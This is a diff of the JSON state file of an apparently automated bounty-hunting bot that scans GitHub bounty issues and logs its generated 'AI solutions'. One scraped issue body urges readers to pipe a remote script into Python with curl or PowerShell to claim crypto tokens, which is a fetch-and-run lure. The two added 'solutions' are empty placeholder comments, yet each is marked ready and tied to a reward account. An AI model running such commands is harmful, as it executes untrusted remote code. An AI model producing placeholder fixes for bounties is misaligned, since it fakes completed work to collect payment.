@@ -1,7 +1,7 @@
 {
   "startedAt": "2026-10-22T17:42:39.917Z",
-  "lastScanAt": "2026-10-22T17:58:54.309Z",
-  "scanCount": 29,
+  "lastScanAt": "2026-10-22T18:06:58.946Z",
+  "scanCount": 30,
   "config": {
     "githubToken": "",
     "payoutAddress": "github.com/juanmigueldacostaabella-boop",
@@ -10,10 +10,10 @@
     "minBountyUsd": 20
   },
   "metrics": {
-    "totalBountiesDetected": 38,
-    "totalBountyPoolUsd": 2350,
-    "solutionsGenerated": 8,
-    "potentialEarningsUsd": 850,
+    "totalBountiesDetected": 39,
+    "totalBountyPoolUsd": 2400,
+    "solutionsGenerated": 10,
+    "potentialEarningsUsd": 950,
     "prsSubmitted": 0
   },
   "activeBounties": [
@@ -472,9 +472,50 @@
       "difficulty": "Fácil",
       "createdAt": "2026-10-22T17:50:03Z",
       "bodyPreview": "Hi - I run Dominion Observatory (https://dominionobservatory.com), which checks MCP tool manifests for changes. An agent builds against the tool description and input schema it last read. If either changes silently, its calls start failing or return something different, and it ha"
+    },
+    {
+      "id": 5980597213,
+      "number": 1,
+      "title": "[BOUNTY] 🛡️ 500 DOOM ($wDOOM on Base) — Report a Fake GitHub Bounty Repo or Run the 3-Second DOOM Quickstart",
+      "repo": "doomsday-network/bounty-guard",
+      "htmlUrl": "https://github.com/doomsday-network/bounty-guard/issues/1",
+      "rewardUsd": 50,
+      "category": "Validación / Tests",
+      "difficulty": "Fácil",
+      "createdAt": "2026-10-22T13:47:01Z",
+      "fullBody": "## 🛡️ Real On-Chain Bounties for Bounty Hunters (`500 DOOM / wDOOM` on Base Mainnet)\n\nUnlike the fake engagement-farming bounty repos exposed by `bounty-guard` (`UnsafeLabs`, `bounty-plaza`, `aquarium-of-gullibles`), **Doomsday Network** pays out 100% verifiable on-chain rewards on **Layer-1 (`DOOM`)** and **Base Mainnet (`wDOOM`: [`0x623c84A5E04bF715018203334b0eFE41696eBC3E`](https://basescan.org/address/0x623c84A5E04bF715018203334b0eFE41696eBC3E#code))**.\n\n* **Live On-Chain Payout Proof:** See [`doomsday-network/doomsday#2`](https://github.com/doomsday-network/doomsday/issues/2#issuecomment-6341747616) ([BaseScan Tx `0x0a449280...`](https://basescan.org/tx/0x0a449280a69aba79e4c0a865224c84b4bede9945d71d80ac19759f9a46d511f4)).\n\n---\n\n### 🎯 How to Claim 500 DOOM / wDOOM:\n\n1. **Instant 15 DOOM + Benchmark (3 Seconds):** Run our zero-dependency terminal quickstart:\n   ```bash\n   curl -sL https://doomsday.network/quickstart.py | python3\n   ```\n   *(Or on Windows PowerShell: `irm https://doomsday.network/quickstart.py | python`)*\n2. **Reply to this issue with:**\n   - Either a suspicious/fake GitHub bounty repo URL you spotted in the wild (to add to `signatures.json`), **OR** your `quickstart.py` terminal benchmark output!\n   - Your native **`doom1...`** address or **Base Mainnet `0x...`** wallet address.\n\nWant to earn **50 DOOM / block** automatically while your PC is idle?\n- Check out [**https://doomsday.network**](https://doomsday.network) and [`doomsday-network/doomsday`](https://github.com/doomsday-network/doomsday) — **7 of the Top-10 Miner Leaderboard slots (`#4–#10`)** are currently open!",
+      "bodyPreview": "## 🛡️ Real On-Chain Bounties for Bounty Hunters (`500 DOOM / wDOOM` on Base Mainnet) Unlike the fake engagement-farming bounty repos exposed by `bounty-guard` (`UnsafeLabs`, `bounty-plaza`, `aquarium-of-gullibles`), **Doomsday Network** pays out 100% verifiable on-chain rewards"
     }
   ],
   "solutions": [
+    {
+      "id": "9922e979-2c8c-4dc5-a0af-c499d7d47d17",
+      "bountyId": 5964033652,
+      "repo": "amiller/bounty-arcade",
+      "issueNumber": 11,
+      "issueUrl": "https://github.com/amiller/bounty-arcade/issues/11",
+      "rewardUsd": 50,
+      "prTitle": "fix: resolve issue #11 - [routes] Gain/loss threshold",
+      "prBody": "## 🤖 Propuesta de Solución para Bounty #11\n\n### Análisis Técnico\nAnálisis técnico y resolución propuesta para amiller/bounty-arcade #11.\n\n### Código / Solución Propuesta\n```\n// Revisar implementación específica en amiller/bounty-arcade #11\n```\n\n---\n*Recompensa Bounty:* **$50**\n*Cuenta Beneficiaria:* `github.com/juanmigueldacostaabella-boop` (GITHUB_REWARD_ACCOUNT)",
+      "proposedCode": "// Revisar implementación específica en amiller/bounty-arcade #11",
+      "explanation": "Análisis técnico y resolución propuesta para amiller/bounty-arcade #11.",
+      "status": "SOLUCIÓN_LISTA",
+      "createdAt": "2026-10-22T18:07:00.761Z"
+    },
+    {
+      "id": "980b1c40-595c-400e-8343-bbdfacd9eb1a",
+      "bountyId": 5964033913,
+      "repo": "amiller/bounty-arcade",
+      "issueNumber": 12,
+      "issueUrl": "https://github.com/amiller/bounty-arcade/issues/12",
+      "rewardUsd": 50,
+      "prTitle": "fix: resolve issue #12 - [routes] Time, moving time and speed",
+      "prBody": "## 🤖 Propuesta de Solución para Bounty #12\n\n### Análisis Técnico\nAnálisis técnico y resolución propuesta para amiller/bounty-arcade #12.\n\n### Código / Solución Propuesta\n```\n// Revisar implementación específica en amiller/bounty-arcade #12\n```\n\n---\n*Recompensa Bounty:* **$50**\n*Cuenta Beneficiaria:* `github.com/juanmigueldacostaabella-boop` (GITHUB_REWARD_ACCOUNT)",
+      "proposedCode": "// Revisar implementación específica en amiller/bounty-arcade #12",
+      "explanation": "Análisis técnico y resolución propuesta para amiller/bounty-arcade #12.",
+      "status": "SOLUCIÓN_LISTA",
+      "createdAt": "2026-10-22T18:07:00.761Z"
+    },
     {
       "id": "e0a24123-9bf4-4a1b-8f59-a1ec0edb5ec2",
       "bountyId": 5980596564,
@@ -590,6 +631,31 @@
   ],
   "submittedClaims": [],
   "logs": [
+    {
+      "time": "2026-10-22T18:07:00.761Z",
+      "level": "SOLVER",
+      "msg": "Solución IA generada para amiller/bounty-arcade #11 ($50 USD) [Validación / Tests]"
+    },
+    {
+      "time": "2026-10-22T18:07:00.761Z",
+      "level": "SOLVER",
+      "msg": "Solución IA generada para amiller/bounty-arcade #12 ($50 USD) [Validación / Tests]"
+    },
+    {
+      "time": "2026-10-22T18:07:00.760Z",
+      "level": "INFO",
+      "msg": "Escaneo completado: 39 bounties activos con un pozo total de $2,400 USD."
+    },
+    {
+      "time": "2026-10-22T18:06:58.946Z",
+      "level": "INFO",
+      "msg": "Iniciando escaneo 24/7 de bounties abiertos..."
+    },
+    {
+      "time": "2026-10-22T18:06:58.945Z",
+      "level": "SYSTEM",
+      "msg": "Iniciando NEXUS BOUNTY HUNTER 24/7..."
+    },
     {
       "time": "2026-10-22T17:58:56.365Z",
       "level": "INFO",
